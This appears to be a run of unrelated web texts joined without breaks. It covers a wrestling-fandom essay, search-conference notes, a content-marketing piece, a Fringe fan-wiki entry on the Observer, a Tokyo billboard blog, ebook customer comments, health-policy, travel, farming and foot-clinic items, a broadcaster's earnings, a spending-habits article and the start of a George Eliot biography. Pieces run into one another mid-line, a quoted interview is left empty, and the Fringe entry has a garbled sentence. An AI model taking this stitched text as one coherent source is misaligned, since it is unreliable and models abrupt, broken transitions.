On the other hand, there’s literature. While of course a book is constructed by the means of production and the national discourse to which the author subscribes, a particular reader’s agency is relatively insignificant or non-existent in affecting the book’s internal world. The reader possesses the lens of analysis, yes, and his interpretation of the book may be different than someone else’s as affected by things like his education, what he can relate to or even how well he paid attention, but the printed contents of the book stay the same, short of crossing out words. That’s how I kept Dumbledore from dying.
So where does wrestling fit in this spectrum? Like reading a book, there’s no controller. You can’t give a direct input that automatically manifests as an action in the game. However, like video games, a wrestling company is not static. It evolves week-by-week following the models of their shows and directives from various administrative tracks, which all serve kind of like a video game’s laws of physics.
So where do the wrestling fans come in? Though we don’t have a controller, there are still tons of ways in which we can impose our agency on the company. Most obviously, through SHOUTING LOUDLY AT THE PEOPLE IN THE RING, otherwise known as “cheering.” Take, for example, the enraged reactions of audiences in Florida following what I personally refer to as, “That time the WWE really made me want to dropkick everyone at their headquarters, but not Triple H or Vince McMahon because they’re big and scary,” when Daniel Bryan lost the World Heavyweight Championship to Sheamus in 18 seconds at WrestleMania 28. What followed was an excellent rematch at Extreme Rules (the match we should have gotten at WrestleMania) and a three-month rivalry against CM Punk (and Kane for a shorter period) that began with my personal Best Match of 2012 at Over the Limit and culminated with another match of the year contender at Money in the Bank. Were it not for the fans’ reactions, we probably would have never had that stellar rivalry between CM Punk and Daniel Bryan, or at least not at that time. (Fun fact: one of my dream main events is CM Punk defending the WWE Championship against Daniel Bryan in a 60-Minute Ironman Match at WrestleMania. Probably not possible during this part-timer era, but a dude can have his dreams.)
A wrestling audience’s agency can be seen more fundamentally than that though. Many seasoned wrestlers will tell you that you need to listen to the crowd while performing. Throughout a match, you’ll see a lot of behaviors responding to particular cues from the crowd. One popular spot is with a face (especially one prone to walking the line between clean and dirty tactics) locking in an Abdominal Stretch and grabbing the rope multiple times when the ref’s not looking in response to the audience egging him on to do so. When I had the pleasure of seeing a RAW house show at the Colorado Springs World Arena (a house show we got months later instead of an ECW/SmackDown taping thanks to the Denver Nuggets Debacle), Jack Swagger for whatever reason received a face reaction throughout his match, and when he used this spot he reciprocated the audience’s request to grab the ropes a second, a third and finally a fourth time in between the referee checking on him.
Similarly, a wrestler may taunt at a certain moment in response to the audience; and a wrestler may also respond directly to chants throughout a promo. The Rock’s and John Cena’s promos throughout their three-year storyline are great examples of the latter, considering the popular chants that have grown out of their interactions. On several occasions, we’ve seen fans chanting one of these phrases, often drawing a direct response from one of the two men in the ring. While this might only be a small example of wrestling fans’ agency, it’s still a great example to counter the static nature of a book. Wrestlers aren’t just in the ring following a pre-determined match structure or (now-bulleted) script for promos; they’re responding to the cues of the audience, or at least the receptive wrestlers do.
There are a ton of other outlets through which our agency can be inputted into a show’s production. Tweets, Touts, forums, blogs (perhaps these Internet-based outlets would make a good subject for another article) – all of these help create a popular discourse surrounding wrestling that WWE reciprocates, though of course not all the time or even wholly when they do. Zack Ryder is a good example of when our agency fails to foster a long-term change in the company. Despite terrific fan reactions and a strong following for his YouTube show, the WWE quickly lost interest in his development after they fed him to the “Embrace the Hate” storyline. It’s demonstrative of audience agency that they even pushed him to begin with; but it also shows our agency’s limitations, as WWE has proven itself capable of ignoring us in favor of their own ideas.
Recently CM Punk did an interview in which he stated, ” ().
Notice how CM Punk uses the same word, “organic,” which is used in discussing a common principle in video gaming. When things happen organically in video games, it’s occurring within the game’s laws of physics and the input of the gamer, not because of scripted sequences. When things happen organically in wrestling, it’s because the show is responding to its own laws and the agency of the audience. Stars become superstars when they are genuinely adored by the masses of wrestling fans, not because the WWE jobs out a bunch of dudes to someone until we think he’s a “big deal,” only to get shuffled to the back when they want a fresh piece of gum.
I think it’s important we understand these outlets of agency, how they manifest in the performance and when our agency fails. It makes us more aware of how we might impact the future of the performers and the shows. If there’s a guy you think has potential, don’t just give him a golfer’s clap – freaking EXPLODE! Let him and the guys in the back know you think he could be a big deal. Remember, when you cheer, chant, Tweet, Tout, blog or post on a forum, you’re not just voicing an opinion, you’re contributing to the discourse that helps construct all of professional wrestling. It’d be unrealistically idealistic to say we’re the bottom line in all events that happen in the WWE, but we play a role. Love it, act on it, and don’t you freakin’ forget it.

It’s been an extremely hectic week so far, and today is no exception. I’m currently sitting in a great session “Linkbaiting & Viral Search Success” – so I thought I’d give a run-down of the other sessions I’ve hit so far this week.
Monday: Long story short – missed my flight Monday morning (wasn’t entirely my fault), so I only got to see the afternoon sessions.
- Personalization, User Data & Search: Covered the trend towards personalized search results, and the impact on search engine optimization (SEO). Some takeaways:
- Excellent content from Gord Hotchkiss @ Enquiro showed that personalized search results pages caused users to scan more results from the page.
- User behavior will drive personalized search results. Stats that search engines may be paying attention to: click through, time to return to the search engine, type of query
- Personal pagerank will drive results. users will have a value assigned to them based on their search behavior, and more influential users will drive search rankings
- Group data: people with common bookmarks, search behavior, & visits to similar sites will impact rankings
- How to influence? designing for users over keywords, content & site stickiness & usefulness will matter more than ever. Getting visitors to stick around or to visit other sites via your links will help your site rank higher. You don’t want them going right back to the search engine
- Searcher behavior research update: I was hoping for lots of stats related to search engine usage, queries, etc. What I got was pretty good though.
- More proof that appearing in search results improves unaided brand recall (brand awareness & association)
- Bidding on the same terms that you have organic rankings for is useful. Study shows: 16% lift in brand recall when in top organic and sponsored listings, an 8% improvement in purchase consideration, 10% increase in purchase intent
Monday Night: First, hit the speaker networking reception on the convention center patio, then went to dinner with Scott Orth & his peeps from GTS, Matt McGee & Darcy from Marchex, Stoney DeGeyter & the PolePosition gang, David Wallace, and a few others. Despite best efforts, we tried to rally for a bar-crawl but downtown San Jose conspired against us – everything was closed, so I called it an early night.

- Ad Testing Research & Findings: introduced a lot of best practices. Too many ideas & suggestions to list here, but some quick & easy ideas: separate branded & unbranded keywords when performing your test (these searchers behave differently), test ads by match type, and again – buying ads for branded queries generally improves conversion even if they don’t drive traffic

$43.6B U.S. agency revenue
In a world where the amount of digital information created and shared has escalated by more than nine times since 2005 -- with more than 27 million pieces of content being shared every day, according Nielsen -- the bar has been raised for branded content experiences to capture consumers' attention and resonate. Content can have massive reach and the power to influence purchase decisions. But too often marketers try to create content without taking the foundational steps first.
Good content marketing isn't a one-off. It takes strategic rigor and organizational alignment to achieve the speed, scale and continuity to be successful. If you are going to invest in content marketing, invest in the right way of doing it.
Here are five best practices -- from A to E -- that will consistently deliver valuable content and drive business results for your brand.
Applicable
Content must be applicable to your audience's behaviors and interests. Good content marketing should create currency, or a meaningful value exchange with your audience. To get to the right approach, ask yourself these two questions: Why should people care and will they be inspired to share? Quality content marketing will move consumers to take the next step.
Nivea Sun (not a 360i client) won big in Cannes this year because it took the idea of protecting children at the beach to a new level. The innovative branded content campaign demonstrated Nivea not only offers protection from the sun's harmful rays, but the magazine-ad-turned-wristband could also be used by parents at the beach to keep their children within a safe distance using their mobile devices. By considering what parents care for most -- the safety of their children -- they were able to create applicable branded content that promotes the idea of giving kids more protection than ever while giving parents more peace of mind.
Breakthrough
We are in an attention economy. Your brand message is competing for attention, and you're not just competing with other brands. You're competing with world news, Red Bull Stratos, cats and babies. Brands can no longer count on a "Happy Monday" tweet to resonate, or a stock photo of Mount Rushmore to say "Happy President's Day" in an original and compelling way. Create really breakthrough moments by surprising and intriguing consumers. Don't sacrifice quality for quantity, though. It's better to have fewer, higher-impact pieces of work than diluted content that turns into background noise.
Through 360i's strategic partnership with Mashable, we're seeing first-hand through its Velocity technology what makes content resonate and go viral. This past winter, Velocity alerted Mashable's editors to some video content that was quickly gaining momentum. The video featured Canadian airline WestJet (not a 360i client), surprising harried holiday travelers by transforming the airport experience into a Christmas miracle. Mashable was the first to cover this breakthrough content marketing idea, driving one of the outlet's most shared stories to date.
Cross-platform
There is a huge misperception that content marketing and social media marketing -- or even digital -- are synonymous. Yes, there is overlap, but your content marketing strategy should work across channels to connect the dots and develop a cohesive brand voice and story.
By working cross-platform, content can inspire cultural movements. For example, 360i's recent campaign for Oreo, #SnackHacks, started as a consumer-inspired social media post showing how to dunk an Oreo with a fork -- no more dirty fingers, "Problem solved." That post quickly became one of Oreo's most popular, inspiring the brand to build #SnackHacks into a robust content series about innovative ways to play with your food, including live events with celebrity chefs, fan hacks and more. By taking cues from the Oreo community, Oreo has been able to transform that one post into a much bigger movement that continues to grow across channels.
Discoverable
How do we get content the visibility it deserves? Understand the role of every channel across paid, earned and owned. Search marketing, paid social, traditional advertising, PR and influencers are important drivers of your content. You can't just build an architectural wonder for people to discover. More people will find it if you give them a map.
We're seeing that search, paid social and traditional advertising have a more important role in surfacing and amplifying content at a time when organic reach is on the decline and there is increasing competition for consumer engagement. Most notably, YouTube is making its internet celebrities and content creators such as Bethany Mota and Michelle Phan more discoverable with a traditional advertising push that is raising the profile of these influencers through TV, print and OOH advertising.
Ever-changing
The only constant thing in content marketing is change. We can't control the rapid shifts happening in technology and consumer behavior. Marketers can no longer afford to take a wait-and-see approach. Every great content strategy should have room to pivot when needed.
So get experimental and tell great brand stories by rethinking how you organize, invest in, integrate and measure to get to great content marketing.The Observer
The Observer has made many cameo and focal appearances, and is one of several Observers.
About
In The Arrival, the Observer is seen taking notes in a small black notebook, writing using an unknown set of characters, and, for the first time, speaking. This may be code or another language altogether, but is presumably taking notes on his observations of The Pattern.The Observer, and possibly the other Observers, seem to have the ability to share thoughts with others telepathically; he can also read and accurately predict the thoughts of others, as he demonstrates during his encounter with Peter Bishop.August in August after he prevents a girl named Christine Hollis from being on a plane that is destined to crash some hours later.
He appears at many Fringe-related incidents involving Olivia, the Bishops and the Pattern. He does not seem to be involved in the direct cause of the events, but simply observing them.
In Fracture, as he eats in a diner, the Observer receives a briefcase with surveillance images of Walter from a secretive courier. The images contain data much like the images he saw through his binoculars in The Arrival.
He uses a specialized communications device in The Arrival, Brown Betty, and Marionette.
In Walter's tall tale during Brown Betty, he is called Gemini and is referred to as a Watcher.
At the beginning of Neither Here Nor There, his comrade December hands him a small metallic bar and orders him to completely destroy the existence of Peter Bishop. He then collects several items, i.e. a ray cathode tube, to create a device that will completely erase Peter. At the end of the episode he has the device and is about to activate it, but thinks better of it and does not erase Peter.
At the end of Back To Where You've Never Been, he shows up in The Orpheum theater where Olivia is waiting for Peter and Lincoln to return from their mission. He has a gunshot wound in the chest and warns Olivia she has to die in all possible futures.
He appears to Peter and Walter in The End Of All Things, and then collapses with a gunshot injury. Peter used the Synaptic Transfer to enter his mind. He explains to Peter that he and his colleagues are from one of humanities possible countless futures and that their technology has uniquely afforded them the ability to travel within and outside of time so that they may observe their beginnings. Peter is suddenly yanked out and September disappears. In A Short Story About Love, Walter find out that September hid a message in Peter's eye before the other Observers took him from the lab. The message leads Peter to September's apartment and he finds a Beacon which helps September to find his way back to this universe. He tells Peter that the Olivia Dunham of this timeline is Peter's Olivia.
In Brave New World, Part 2, he is captured by Jessica Holt with Stasis Runes. She says that he seems very concerned about Peter and Olivia's lives. She tells them that he is able to move very fast due to his tech, therefore he cannot be shot with a normal gun. She shoots him with a new and faster gun that was developed by William Bell. The Observer is unable to catch the bullets and is injured. When Jessica wants to fire again, Olivia catches the bullets and redirects them at Jessica. After Peter has removed the runes, the Observer leaves to investigate the future. He later appears in Walter's lab and warns him that 'They are coming'.
In Letters Of Transit, Walter says that something 'unexpected' happened to September. In The Boy Must Live, the other Observers remove his tech implant from his neck and experiment on him. Due to this, he became a human with emotions and hair. He assumed the name of Donald O'Connor after watching the movie Singin' In The Rain with Walter. Donald and Walter worked on a plan to defeat the Observers. They want to bring September's offspring, Michael, to 2167 to show the scientists that they don't have to sacrifice emotions for intelligence. If the plan is successful, the Observers will never exist and therefore not invade the planet.
Background
- He was part of a scientific team that was sent to the past to observe their beginnings. His code designation was 'September'.
- He was the donor of genetic material for another Observer. When scientists realized that the boy's brain developed differently, they stopped his maturation and labeled him "Anomaly XB-6783746". The Observer hid the boy in the past to protect from the other Observers and he was later found by the Fringe team in Inner Child. Some time later, the Observer brought the boy to a couple who called him Michael.
- In the alternate universe 1985, The Observer enters Secretary Bishop's lab and distracts him just as the cure to Peter's genetic ailment is discovered, and lost.
- In the alternate universe 1985, The Observer confesses to fellow Observers that he interfered in Secretary Bishop's experiment to cure his son.
- In 1985, The Observer saved Peter and Walter Bishop from drowning after falling through frozen Lake Reiden, just after Walter abducted young Peter from the alternate universe.
- He was on-hand at the first documented arrival of the Beacon at Quantico MB in 1987.
- In 2011, following the timeline reset, Walter and the Fringe team have no idea who 'Observers' are. The man claiming to be Peter Bishop (Novation) learns from Walter that his son Peter died, and that the Peter Bishop from the alternate universe that Walter tried to cure never survived the trip. He drowned in Reiden Lake when The Observer did not intevene in the mishap.
- Before the Observer invasion in 2015, the Observer was punished for his interference in the timeline. His device was removed.
- In 2036, he lives under the name of Donald O'Connor.
- In 2036, he planned to bring Michael to the year 2167 to show the scientists that they do not have to sacrifice human emotion to increase intelligence. However, the Observer was killed and Walter took Michael to the future for him.

The Observer shares some commonalities with the Marvel Comics character Uatu the Watcher. Uatu is a member of the alien race known as the Watchers whose people have taken an oath to observe other species but are sworn to never to interfere with their affairs.

The series "What If" revolved around Uatu telling the audience about how events in an alternate reality differed from those of the mainstream Marvel Universe timeline.
The Observer resembles The G-Man of the Half Life series of first-person shooter video games. Similarities include: Displays abilities beyond that of ordinary humans, does not seem to age, frequently carries a briefcase

I'll be the first to admit that I don't speak great Japanese. To be honest, I don't speak any Japanese at all. But a friend sent me this link with a premise so interesting that I couldn't resist posting about it, regardless of the risk that it may be completely out of context.
According to my friend, this neat bit of printing news is that in Tokyo – one of the billboard / outdoor signage capitals of the universe – businesses have started to buy up billboard space in order to leave it blank and clear up the skyline a bit.
Lately, folks have started to notice that prime billboard real estate in Tokyo is going blank, and the word is that this isn't the product of the recession, but of an investment in white space.
Some of these billboards (so the story goes) are even digital, and have been covered in plain paper by investors. What did I tell you about digital billboards being too, too much!
Of course, this could simply be a misunderstanding of a Japanese blog post by English readers, but regardless, what a concept! Even the most fervent print lover has to admit that billboards – especially when they're digital, and so crammed together that they block out the sun – are not exactly crowd-pleasers. Imagine the interest one could attract if a billboard adspace is deliberately left blank! And actually covering a digital billboard in paper takes the concept to a whole other level by cutting down on light pollution.
Could it be that 2010's biggest advertising trend will be anti-advertising? And if so, how do investing businesses get the word out that they're responsible for clearing up the billboard clutter?
It seems like the best idea here might be to buy digital adspace and paper it over with a subtle “you're welcome!” style print ad. Particularly in areas with a lot of private homes, digital billboard controversy is reaching a boiling point. A smart business could garner great attention by papering over these eyesores with a print ad.

WoW! What a resource and inspiration this ebook is - I have absolutely no regrets that I purchased your book! Thank you for allowing me a new adventure!
rebecca - justgiddy
Hey hun, I bought this wonderful book in the previous sale & was just wondering what the new updates are, if it is possible to purchase only the updates? Thank you!
I bought this at the end of the e-course and love it, but could not view it on my iPad or iPhone because it wasn't created in IOS format. I would consider purchasing it again if I can have it on the go. Is this one created the same or is it compatible with mobile devices in its PDF form? Thanks...
Illene, YES, you can read it on the ipad. You just need to download it to your itunes on your computer, then sync you ipad and then it will show up in your reader on your ipad (ibooks, etc)
Hello Kelly,
Thank you for the offer. I buy your e-book today. It was right on time!
Yesterday evening (Dutch time) I was talking to my husband about how difficult it is for me to start a blog.
It is a wonderful book, I love the lay-out and links.
Thank you!!!
Herma
I DID IT!! I have eyed this course for some time and was just never able to make the investment. This sale came at the perfect time!!
I am so excited to download it and cannot wait to use it to enhance and grow my business!
Thank you for your generosity!!
I too just downloaded it....I couldn't wait!! : ) If anyone wants to answer my "sync" questions that would be great, buy while I wait I am going to enjoy it on my desktop!!! : )
Thanks Kelly!! You feel like a trusted friend!! I can't wait to dig in!! : )
And...my sync question was....How do you download it to your iTunes? : ) Sorry about all the deleted posts!!
So very, very excited to dig into this beautiful book. Your sale came just one week after I launched my website, and I know it will fuel my creativity. Divine timing. Yeah!
curious also about the iTunes download. I did download and didn't see an iT option. Suggestions? tx.
Yeah! I did your E-Course 3 years ago and LOVED it! Excited to re-visit it!
Hi guys, on iTunes on the left hand sidebar you will see a folder for BOOKS. Add the ebook to that section/folder on your iTunes. Then, sync your iPhone or iPad and the ebook will be readable in your ibook app.
I wish you continued success dear Kelly .... you deserve every morsel of love and gratitude shown you.
I am so bummed right now. I didn't have a chance to read your email about the book offer on Thursday until today ... and now I've missed it! Just as well, I didn't have the money. I so wish it was still offered at that price because I'd go for it now in a heart beat. That is not to say the value isn't worthy of the normal price ... no no, it is very much worth every penny. It's me ... just haven't had the funds to buy what I need when I need it. Frustrating.
I need to get my business tuned up ... started over, well, started because it really hasn't yet. Too much life got in the way of my dreams taking flight. I need to Fly, so I will add this to my journal of Have to Haves ... which is quite long =0)
When I save up enough, it's getting added to my virtual bookshelf!
IN the meantime know that I am inspired by your charm and positive attitude and I do see my dreams taking shape because I am a Possibilitarian too!
I can't wait to actually own your book so I can ... soar!
So much love ... xo

I am drawn to take your 4 part course but could u pls tell me if u'll be teaching the nuts and bolts of social media marketing as I really need to make myself visible! Thanks, Rosa
Kelly, I need to confirm with u if u actually guide me through on social media marketing as I want to get my biz off the ground and being technology-phobic doesn't help. I have paid for a similar e-course with
Kimberley Wilson and it was a complete waste of money as I learned nothing from it.
Btw, when is the deadline of enrolment?
Rosa
I just wanted to tell you thank you for this. I finished reading it thru in under 2 days of off and on reading while sitting in hospital waiting rooms with my MIL and now I am going back and re-reading and taking more notes from each section. It is has been the best investment that I could have ever made in my business. It was well written and very informative. thanks again so much.
thanks forAll about the C students
By jeremy.engdahl-johnson
Modern Healthcare looks at the financial risks facing potential accountable care organizations (ACOs). Here is an excerpt:
The highest performers may not achieve the most savings, warned actuary firm Milliman in a separate report. Providers will need to conduct risk analyses before signing on to Medicare’s shared savings program, according to Milliman. For instance, high-performing systems may not be able to produce sufficient savings. “It will be easier for the inefficient systems to beat their targets,” according to the report.
For instance, “ACOs operating with low inpatient utilization and low cost will need to work hard on non-inpatient services to achieve significant savings,” according to Milliman. In conclusion, Milliman actuaries said the proposed rule offers “much less upside to ACO ‘A’ students who operate in very efficient systems than to ACO ‘C’ students who operate in systems with a lot of inefficiencies.”St. Augustine is a Top 10 finalist in Coastal Living Magazine’s search for America’s Happiest Seaside Town 2014.
“St. Augustine has received several accolades recently, including this one,” said Kathryn Catron, director of communications for St. Augustine, Ponte Vedra & The Beaches Visitors and Convention Bureau.
Catron said someone from Coastal Living contacted her organization to say that St. Augustine was on the list.
“Yes, they called and emailed us. They looked at our 42 miles of unobstructed beaches and the quality of life here,” she said.
The magazine highlights beachside living throughout the United States with stories about homes, destinations, activities and people along the Atlantic, Pacific and Gulf shores of North America.
“When we set out to compile our list of the 10 Happiest Seaside Towns for 2014 we considered every place Coastal Living has lauded as a dream town over the past 17 years, and we also took nominations on Coastalliving.com and through our social media platforms,” said Antonia van der Meer, editor-in-chief of Coastal Living.
“We love St. Augustine for the stunning beaches and European-style architecture. It’s a pedestrian-friendly city with natural beauty and historic charm, and of course we love the lighthouse.
Other towns include Bolinas, Calif.; Captiva Island, Fla.; Chincoteague, Va.; Haleiwa, Hawaii; Provincetown, Mass.; Saugatuck, Mich.; Scarborough, Maine; St. Simons Island, Ga.; and Watch Hill, R.I.
“We looked at the Gallup-Healthways Well-Being index, percentage of clear and sunny days, healthiness of beaches, commute times, walkability, crime ratings, standard of living and financial well being of the locals, geographic diversity, and our assessment of each town’s ‘coastal vibe,’” van der Meer said.
“This is the third year we’ve come up with this list and the winners from 2012 and 2013 were not eligible. What we came up with this year is an amazing list that includes towns from every coast and now it is up to voters to choose their favorite.”
The March issue of Coastal Living, which is on news stands now, includes a list of the 10 finalists for America’s Happiest Seaside Towns for 2014. Fans can vote for their favorite at coastalliving.com/happytowns2014.
“Voting is open until March 31 and based on votes, the towns will be ranked No. 1 to No. 10, and each town will be featured as part of our cover story in the July/August issue,” van der Meer said.
St. Augustine Beach resident Bill Jones agrees that his town has all those things and more.
“I was in the radio business for more than 15 years and lived all over the country, and St. Augustine, by far, is the most enjoyable place to live and work,” said Jones, president of the St. Augustine Beach Civic Association.
Jones said he would like to think that the events sponsored by the Civic Association add to the quality of life in the area, such as the Music by the Sea concert series held each year.
“I’m proud and excited … I feel that the Civic Association is part of the quality of life,” he said.
“(St. Augustine) is a diamond in the rough, a well kept secret. But I think more and more people are finding out what we already know.”

Updated
Most farmers would agree the Australian approach to farming has changed dramatically in the last thirty years with greater input from farm consultants, grain marketers and banks.
However some things haven't changed very much, most family farms are still structurally just that, run by one family on a scale that one family can manage.
Nuffield Scholar John Gladigau believes changing that structure will be the next big advance in Australian agriculture.
His family is part of a collaborative farm where he works in partnership with his neighbours.
Each family retains ownership of their property and the business is owned and operated jointly.
Mr Gladigau says this allows them to run a larger more efficient, professional business.
"We probably go about it with a bit more corporate thinking I guess, in that we try to create a structure where there's and opportunity for us all to have input in a way where our skills are best utilised," Mr Gladigau said.
A feature of the collaborative farm is a board like structure that sits above the business with and independent chair.
Mr Gladigau says this is a useful way to take emotions out of decision making.
"The biggest threat to this business and any kind of collaborative business is emotions and personalities."
"We think probably the one essential ingredient is to have someone independent or more than one independent in there who is ensuring that everyone's voice is heard and ensuring that everyone's needs are met," he said.

In a fantasy world, anything is possible. In real life, however, skeletons can’t move on their own. Our bones form the basic structure of our bodies, but without the other tissues that surround them, they remain static. We need the ligaments and tendons that hold them together and the muscles that pull on them and release in order to move and walk around. A broken bone may be a serious problem, but soft tissue injuries are just as likely to give us pain and sideline us from our activities.
Signs of Battle
A soft tissue injury is damage to your ligaments, tendons, and muscles—not your bones. All three types of tissue can be harmed from a single event like a fall or a blow, or from continued overuse such as running every day. When the tissue is damaged, you may feel pain and swelling around the injury and you may develop a bruise that discolors the skin.
These symptoms may also indicate an underlying fracture, though. Any injury that limits your movement should be checked out at Abbott Foot & Ankle Clinic. We can properly diagnose the cause and recommend the best treatment so you can fully heal and avoid problems in the future. Following are some common injuries involving your soft tissues.
Sprain – Ligaments hold your bones together to keep your joints stable. When the joint moves beyond its normal position, the ligaments can be pulled or stretched too far—or even torn. This commonly happens in your ankle when you step on uneven ground or twist it during activity. The degree of sprain can vary from mild to severe. Mild cases may only need Rest-Ice-Compression-Elevation (RICE) therapy to recover, while more serious sprains may require wearing a brace or even having surgery to repair a torn ligament.
Strain – This injury is similar to a sprain, but it affects the tendons or muscles, rather than the ligaments. Tendons connect your muscles to your bones. Muscles and tendons, like ligaments, can stretch too far or tear. The damage most often occurs in your foot or leg, and the treatment is similar to that for a sprain.
Tendonitis – This condition occurs when your tendon endures repeated small stresses, which cause it to become inflamed. Runners, soccer or basketball players and professional dancers are very prone to tendonitis. The damaged area will swell, turn red, feel warm, and be painful. You will need to rest from activity to allow your tendon to heal. Other treatments may include anti-inflammatory and steroid medication, splints and physical therapy.
Bursitis – A bursa is a membrane filled with fluid that acts as a cushion between your bone and a tendon or muscle. When it is aggravated by overuse, it can become irritated and swollen—a condition called bursitis. This injury can often occur along with tendonitis, and responds well to rest, with medication possibly needed to reduce the inflammation.
Contusion – When a blow to your muscle, ligament or tendon causes the blood to pool there, your skin will become discolored. You can follow the progression from red to purple to shades of green and yellow as it heals. The RICE method is usually an effective treatment.
Do No HARM
All of these soft tissue injuries can be painful, which could limit your activity. According to Better Health Channel in Australia, you should avoid HARM during the first few days after an injury to avoid increasing blood flow and swelling in the area. The acronym stands for Heat, Alcohol, Re-injury and Massage, all of which should be avoided for 48-72 hours after injury.
If you have symptoms of injury to the soft tissue of your lower limbs, contact Abbott Foot & Ankle Clinic in Collingwood, Ontario at (705) 444-9929 for a consultation. Chiropodist Tony Abbott is expert at discovering the cause of your pain and finding conservative treatments that will relieve your discomfort and get you moving again.

HONG KONG — Profits at Phoenix Satellite Television increased by 17% in 2006 to $27.1 million (HK$212 million).Group, which is the major Mandarin-language broadcaster based in Hong Kong that has partial access to the mainland China market, last year saw News Corp. cut its stake from 38% to 18%. Revenue inched ahead by only 2% to HK$1.06 billion ($135 million), but net result was boosted by a $1.78 million (HK$13 million) tax gain. Phoenix prexy Liu Changle said company has solidified the turnaround it achieved in 2004 and now has a business model that “will work very well in the coming years.” News Corp. sale notably allowed China Mobile to become company’s second largest shareholder. Liu praised the core Phoenix Chinese Channel despite a revenue drop of 4% and said that slide had been more than compensated for by the growth of the Phoenix InfoNews operation. Liu described InfoNews as the “outstanding broadcaster of international news in the Chinese-language market,” and said it enjoyed a 35% increase in revenue. “Phoenix did extensive reporting on Taiwan, including the mass protests aimed at removing (President) Chen Shui-bian from office, which were rarely mentioned by any other Chinese-language television services broadcasting to the mainland Chinese audience,” Liu said.Free Britelife Summit on Happiness

0Three Ways Our Spending Habits Are Totally Wrong
It's not just the pursuit of more money that can buy unhappiness. We could be funding our misery with the hard-earned cash we already have.
Elizabeth Dunn, associate professor of psychology at the University of British Columbia in Vancouver, studied how spending habits bear on quality of life for her book "Happy Money: The Science of Smarter Spending." We revisit her conversation with Krys Boyd at noon on KERA 90.1 FM for our series "Best of Think 2013."
[Listen to the show here.]
So when it comes to spending our hard-earned cash and living our lives, what are we doing wrong? Here are three ways:
1. Too many splurges on the small pleasures -- nail appointments, expensive coffee -- can ruin the experience.
Even if you can afford to stock your calendar and cabinets with favorites, Dunn says overkill will dull your appreciation of those little things more than de-stress you on the regular.
"It turns out that abundance is kind of the enemy of happiness," she says.
2. The new place will wear off -- and so will carefully chosen maple hardwoods.
"One of the most surprising findings in the research that we did is that owning a home or moving to a newer, nicer home seems to have little to no bearing on happiness," Dunn says.
And all those Saturdays spent laboring (and arguing, perhaps) over details -- the kitchen backsplash tile, which gloss of sage green wall paint -- may prove wasted when the novelty's gone.
"These fine-grain distinctions between various products end up having less of an impact on our happiness that most of us tend to assume," she says.
3. Just because you can make the long drive to work doesn't mean you should.
Having a long commute to work is almost as bad as being unemployed when it comes to our happiness, Dunn found.

Chapter One
`Dear Old Griff'
* * *
Early Years
1819-28
In the early hours of 22 November 1819 a baby girl was born in a small stone farmhouse, tucked away in the woodiest part of Warwickshire, about four miles from Nuneaton. It was not an important event. Mary Anne was the fifth child and third daughter of Robert Evans, and the terse note Evans made in his diary of her arrival suggests that he had other things to think about that day. As land agent to the Newdigate family of Arbury Hall, the forty-six-year-old Evans was in charge of 7000 acres of mixed arable and dairy farmland, a coal-mine, a canal and, his particular love, miles of ancient deciduous forest, the remnants of Shakespeare's Arden. A new baby, a female too, was not something for which a man like Robert Evans had time to stop.
Six months earlier another little girl, equally obscure in her own way, had been born in a corner of Kensington Palace. Princess Alexandrina Victoria was also the child of a middle-aged man, the fifty-two-year-old Prince Edward of Kent, himself the fourth son of Mad King George III. None of George's surviving twelve children had so far managed to produce a viable heir to succeed the Prince Regent, who was about to take over as king in his own right. It had been made brutally clear to the four elderly remaining bachelors, Edward among them, that the patriotic moment had come to give up their mistresses, acquire legal wives and produce a crop of lusty boys. But despite three sketchy, resentful marriages, the desired heir had yet to appear. Still,at this point it was too soon to give up hope completely. Princess Alexandrina Victoria, born on 24 May 1819, was promisingly robust and her mother, while past thirty, was young enough to try again for a son. If anyone bothered to think ahead for the little girl, the most they might imagine was that she would one day become the elder sister of a great king.
Officially the futures of these two little girls, Mary Anne and Alexandrina Victoria, were not promising. As for every other female child born that year, the worlds of commerce, industry and the professions were closed to them. As adults they would not be able to speak in the House of Commons, or vote for someone to do so on their behalf. They would not be eligible to take a degree at one of the ancient universities, become a lawyer, or manage the economic processes which were turning Britain into the most powerful nation on earth. Instead, their duties would be assumed to lie exclusively at home, whether palace or farmhouse, as companions and carers of husbands, children and ageing parents.
Yet that, as we know, is not what happened. Neither girl lived the life that the circumstances of her birth had seemed to decree. Instead, each emerged from obscurity to define the tone and temper of the age. Princess Alexandrina Victoria, pushed further up the line of succession by her father's early death, even gave her name to it. `Victorian' became the brand name for a confident, expansive hegemony which was extended absent-mindedly beyond her own lifetime. `Victorian' was the sound of unassailable depth, stretch and solidity. It meant money in the bank and ships steaming the earth, factories that clattered all night and buildings that stretched for the sky. Its shape was the odd little figure of Victoria herself, sweet and girlish in the early years, fat and biddyish at the end. Wherever `Victorian' energy and bustle made themselves felt, you could be sure to find that distinctive image, stamped into coins and erected in stone, woven into table-cloths and framed in cheap wood. In its ordinary femininity the figure of Victoria offered the moral counterpoise to all that striving and getting. The solid husband, puffy bosom and string of children represented the kind of good woman for whom Britain was busy getting rich.
George Eliot's image, by contrast, was rarely seen by anyone. Indeed, it was whispered that she was so hideous that, Medusa-like, you only had to look upon her to be turned to stone. And her name, during its early years of fame, suggested the very opposite of Victorianism. Her avowed agnosticism, sexual freedom, commercial success and childlessness were troubling reminders of everything that had been repressed from the public version of life under the great little Queen. By 1860 Victoria and Eliot had come to stand for the twin poles of female behaviour, respectability and disgrace. One gave her name to virtuous repression, a rigid channelling of desire into the safe haven of marriage and family. The other, made wickeder by male disguise, became a symbol of the `Fallen Woman', banished to the edges of society or, in Eliot's actual case, to a series of dreary suburban exiles.
That was the bluster. In real life — that messy matter which refuses to run along official lines — the Queen and Eliot shared more than distracted, greying fathers. Their emotional inheritance was uncannily similar and pressed their lives into matching moulds. Both had mothers who were intrusive yet remote, a tension which left them edgy for affection until the end of their days. Victoria slept in the Duchess of Kent's room right up to her coronation, while Eliot spent her first thirty years looking for comfortable middle-aged women whom she could call `Mother'. When it came to men, both clung with the hunger of children rather than the secure attachment of grown women. Prince Albert and George Henry Lewes not only negotiated the public world for their partners, but lavished them with the intense and symbiotic affection usually associated with maternally minded wives. And when both men died before them, their widows fell into an extended stupor which recalled the despair of an abandoned baby.
What roused them in the end were intense connections with new and unsuitable men. The Queen found John Brown, then the Munshi, both servants, one black. Eliot, meanwhile, married John Cross, a banker twenty years younger and with nothing more than a gentleman's education. Menopausal randiness was sniggeringly invoked as the reason for these ludicrous liaisons. Victoria was called `Mrs Brown' behind her back. And when John Cross had to be fished out of Venice's Grand Canal during his honeymoon, the whisper went round the London clubs that he had preferred to drown rather than make love to the hideous old George Eliot.
